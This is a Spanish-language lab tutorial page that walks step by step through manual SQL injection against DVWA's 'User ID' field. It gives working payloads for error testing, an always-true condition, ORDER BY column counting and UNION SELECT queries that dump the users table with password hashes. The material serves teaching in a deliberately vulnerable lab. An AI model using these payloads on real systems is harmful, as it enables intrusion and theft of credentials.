---
sidebar_position: 3
title: Práctica manual
---

# Práctica manual (entender la técnica paso a paso)

Entrar a la sección **SQL Injection** del menú de DVWA. Hay un campo que pide un **"User ID"**.

## Paso 1 — Comprobar si es vulnerable

Escribir una comilla simple y enviar:

```
1'
```

Si aparece un **error de SQL**, el campo es inyectable (la comilla "rompió" la consulta).

## Paso 2 — Condición siempre verdadera

```
1' OR '1'='1
```

Se devuelven **todos los usuarios**, no solo el ID 1. Esto demuestra que se logró alterar la lógica de la consulta.

## Paso 3 — Extraer datos con UNION

Primero se averigua cuántas columnas devuelve la consulta (subir el número hasta que dé error):

```
1' ORDER BY 2 -- 
```

Luego se extrae información de la propia base de datos:

```
1' UNION SELECT user(), database() -- 
```

Y finalmente los usuarios y contraseñas de la tabla de ejemplo:

```
1' UNION SELECT user, password FROM users -- 
```

:::note Observación para la exposición
Se observa que las contraseñas aparecen en **hash (MD5)** y no en texto plano. Este detalle sirve para comentar la importancia de guardar contraseñas cifradas.
:::
